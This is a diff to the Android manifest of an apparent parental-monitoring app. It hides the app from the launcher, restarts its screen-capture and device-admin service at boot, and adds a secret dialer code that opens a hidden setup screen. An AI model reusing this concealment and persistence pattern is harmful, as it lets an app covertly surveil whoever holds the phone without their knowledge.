@@ -1,18 +1,49 @@
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
     <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <!-- Auto-start after device boot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <application>
+        <!--
+            Hide the app from the child's launcher / app drawer.
+            We override MainActivity here to strip the LAUNCHER category using the
+            manifest merger 'remove' directive on the intent-filter.
+        -->
+        <activity
+            android:name=".MainActivity"
+            tools:node="merge">
+            <intent-filter tools:node="removeAll" />
+        </activity>
         <service android:name=".LanService" android:exported="false" android:foregroundServiceType="connectedDevice|mediaProjection" />
         <receiver android:name=".PolicyAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
             <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
             <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
+        </receiver>
+        <!-- Boot receiver: auto-starts the service after reboot if already paired -->
+        <receiver android:name=".BootReceiver" android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        <!--
+            Secret dialer code: dial  *#*#7283#*#*  on the child phone to open the
+            hidden setup UI. Invisible to the child — not shown anywhere on the device.
+            7283 = P-A-R-D on the keypad.
+        -->
+        <receiver android:name=".SecretCodeReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="7283" />
+            </intent-filter>
         </receiver>
     </application>
     <queries>
         <intent><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent>
     </queries>
 </manifest>
+
